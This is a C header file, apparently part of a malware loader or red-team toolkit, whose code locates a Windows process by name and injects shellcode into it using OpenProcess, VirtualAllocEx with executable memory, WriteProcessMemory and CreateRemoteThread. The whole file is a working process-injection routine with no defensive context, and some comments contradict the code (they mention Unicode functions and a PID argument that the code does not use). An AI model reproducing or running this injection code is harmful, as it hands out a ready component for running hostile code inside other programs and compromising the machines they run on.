#pragma once 

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include "../debug_print/debug_print.h"



int FindTarget(char* procname) { // Changed to wchar_t for Unicode

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpi(procname, pe32.szExeFile) == 0) { // Changed to lstrcmpiW for Unicode
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

// payload_info format:     pid
// pid specifies the process ID of the process to inject the shellcode into.
//
// This was successfully tested on both 32 and 64 bit systems
void inject_shellcode_procname(unsigned char *shellcode, int shellcode_size, char *payload_info) {
    DEBUG_PRINT("Starting inject_shellcode_procname routine...\n");   

    int target_pid = 0;
    char *target_process = payload_info;
    DEBUG_PRINT("Extracted payload_info::process_name argument = %s\n", target_process);

    DEBUG_PRINT("Finding target PID...\n");
    target_pid = FindTarget(target_process);

    if (target_pid == 0){
        DEBUG_PRINT("Failed to find PID of targeted process.\n");
        return;
    }

    // Access target process
    DEBUG_PRINT("Accessing target process...\n");
    HANDLE h_proc = OpenProcess((PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ), FALSE, target_pid);

    if(h_proc == NULL) {
        DEBUG_PRINT("Failed to retrieve handle.\n");
        return;
    }

    // Allocate target memory for the shellcode
    DEBUG_PRINT("Allocating memory in target process...\n");
    PVOID remote_buffer = VirtualAllocEx(h_proc, NULL, (SIZE_T) shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    
    if(remote_buffer == NULL) {
        DEBUG_PRINT("Memory allocation failed.\n");
        return;
    }

    // Write shellcode into allocated target buffer
    DEBUG_PRINT("Writing shellcode into allocated target buffer...\n");    
    if(WriteProcessMemory(h_proc, remote_buffer, (PBYTE) shellcode, (SIZE_T) shellcode_size, NULL) == 0) {
        DEBUG_PRINT("Write operation failed.\n");
        return;
    }
    
    // Create and start new thread in the remote process, executing the shellcode
    DEBUG_PRINT("Creating new remote thread to execute shellcode...\n");
    HANDLE h_remote_thread = CreateRemoteThread(h_proc, NULL, 0, (LPTHREAD_START_ROUTINE) remote_buffer, NULL, 0, NULL);
    if(h_remote_thread == NULL) {
        DEBUG_PRINT("Thread creation failed.\n");
        return;
    }

    CloseHandle(h_proc);
}
